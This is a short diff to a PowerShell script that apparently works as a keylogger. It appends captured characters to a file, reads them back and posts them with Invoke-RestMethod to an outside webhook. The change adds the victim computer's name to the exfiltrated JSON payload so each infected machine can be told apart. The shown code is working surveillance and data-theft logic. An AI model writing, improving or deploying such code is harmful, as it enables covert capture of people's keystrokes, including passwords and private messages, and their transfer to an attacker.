@@ -55,7 +55,9 @@ try{
             if ($success) {[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}$tnow = Get-Date}
         $msg = Get-Content -Path $Path -Raw 
         $escmsg = $msg -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;') }
-        $json = @{content = $escmsg} | ConvertTo-Json
+        $json = @{"username" = "$env:COMPUTERNAME" 
+                    "content" = $escmsg
+                        } | ConvertTo-Json
         Start-Sleep 1
         Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $json
         Start-Sleep 1
